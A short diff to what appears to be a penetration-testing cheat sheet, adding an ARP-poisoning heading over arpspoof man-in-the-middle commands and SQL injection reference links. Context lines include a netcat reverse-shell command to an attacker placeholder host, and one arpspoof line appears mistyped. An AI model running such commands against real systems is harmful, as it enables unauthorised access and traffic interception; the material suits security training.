@@ -144,7 +144,14 @@
             - On the victime       : nc attacker_ip 8080 -e cmd.exe 
 
 ### 9.Sniffing
-
+#### 9.1 ARP Poisonning
     MiTM between vtcim1 & victm2 using arp poisonning:
         arpspoof -i tap0 -t vic1_IP -r vic2_IP
         arpspoof -i tap0 -t vic2_IP -r vic2_IP
+
+### 10.Web Apps
+#### 10.1 SQLi
+    https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+
+
